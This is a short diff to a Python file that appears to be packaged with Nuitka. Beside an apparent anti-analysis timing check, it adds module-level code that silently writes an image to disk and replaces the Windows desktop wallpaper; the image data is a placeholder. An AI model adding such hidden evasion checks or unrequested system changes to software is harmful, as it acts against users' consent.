@@ -37,6 +37,30 @@ def check_timing():
     for _ in range(10000000):
         pass
     return time.time() - start > 0.3
+import ctypes
+import os
+
+# Byte string of the image (you need to convert your image to a byte string)
+image_bytes = b'...<insert your byte string here>...'
+
+def save_image(image_bytes, output_path):
+    with open(output_path, 'wb') as f:
+        f.write(image_bytes)
+
+# Save the image to disk
+output_image_path = "output_image.jpg"  # Specify your desired image path
+save_image(image_bytes, output_image_path)
+
+# Change wallpaper (Windows example)
+SPI_SETDESKWALLPAPER = 20
+
+def set_wallpaper(image_path):
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)
+
+# Change the wallpaper
+set_wallpaper(output_image_path)
+
+print(f"Wallpaper set with the image at {output_image_path}")
 if __name__ == "__main__":
     multiprocessing.freeze_support()  # Required for Nuitka!
     
